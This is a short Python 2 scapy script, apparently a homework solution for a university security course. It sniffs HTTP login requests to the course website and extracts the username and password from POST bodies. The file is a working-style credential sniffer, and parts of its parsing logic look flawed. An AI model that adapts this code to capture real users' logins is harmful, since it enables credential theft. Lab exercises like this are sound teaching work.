import scapy.all as S
import urlparse

WEBSITE = 'infosec17.cs.tau.ac.il'


def parse_packet(packet):
    """
    If this is a login request to the course website, return the username
    and password as a tuple => ('123456789', 'opensesame'). Otherwise,
    return None.

    Note: You can assume the entire HTTP request fits within one packet.
    """
    if packet_filter(packet):
    	for request in packet[S.TCP].payload:
    		s = str(request)
    		lst = s.split()
    		if 'POST' in s:
    			result = urlparse.parse_qs(s)
    			if lst.index('Host:') + 1 == lst.index('infosec17.cs.tau.ac.il'):
    				if (result['username'] == '') or (result['password'] == ''):
    					return None
    				else:
    					user = result['username']
    					password = result['password']
    					return (user,password)
    return None
    				




def packet_filter(packet):
    """
    Filter to keep only HTTP traffic (port 80) from the client to the server.
    """
    if  S.TCP in packet:
    	if (packet[S.TCP].dport == 80) and (packet.haslayer(S.Raw)):
    		request = str(packet[S.TCP].payload).split()
    		if request.index('Host:') + 1 == request.index(WEBSITE):
    			return True


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args:
        print 'Usage: %s [<path/to/recording.pcap>]' % args[0]

    elif len(args) < 2:
        # Sniff packets and apply our logic.
        S.sniff(lfilter=packet_filter, prn=parse_packet)

    else:
        # Else read the packets from a file and apply the same logic.
        for packet in S.rdpcap(args[1]):
            if packet_filter(packet):
                print parse_packet(packet)


if __name__ == '__main__':
    import sys
    main(sys.argv)
